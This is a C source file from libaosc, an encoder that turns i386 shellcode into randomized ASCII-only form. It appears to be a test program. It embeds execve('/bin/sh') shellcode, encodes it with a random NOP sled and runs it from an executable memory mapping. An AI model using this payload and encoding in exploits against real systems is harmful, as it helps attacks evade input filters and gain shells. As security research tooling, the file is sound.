/* libaosc, an encoding library for randomized i386 ASCII-only shellcode.
 *
 * Dedicated to Kanna Ishihara.
 *
 * Copyright (C) 2001-2009 Ronald Huizer
 *
 * This library is free software; you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as
 * published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include "i386_ascii.h"
#include "wrapper.h"

#define MAX_NOPS 1000

unsigned char shellcode[]=
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

int main(void)
{
	unsigned char *ret_addy;
	struct string ascii_code;
	unsigned int foo, bar, numnops;

	ret_addy = mmap(NULL, 31337, PROT_READ | PROT_WRITE | PROT_EXEC,
	                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (ret_addy == NULL) {
		perror("mmap()");
		exit(EXIT_FAILURE);
	}

	rand_init();
	numnops = rand_uint32_range(0, 1000);
	foo = rand_uint32_range(0, numnops);
	bar = rand_uint32_range(0, numnops);

	/* aos_encode() the shellcode code, with a return address of
	 * 'ret_addy' and use NUMNOPS nops
	 */
	aos_encode_safe(&ascii_code, shellcode, sizeof(shellcode) - 1,
	                ret_addy + foo, numnops);

	printf("Executing shellcode:\n\n");
	string_print(&ascii_code);
	printf("\nReturn address: %p - Encoded return address: %p\n",
					 ret_addy + bar, ret_addy + foo);
	fflush(stdout);

	memcpy(ret_addy, string_get_data(&ascii_code), string_get_length(&ascii_code));
	string_destroy(&ascii_code);

	((void(*)())ret_addy + bar)();

	exit(EXIT_FAILURE);
}
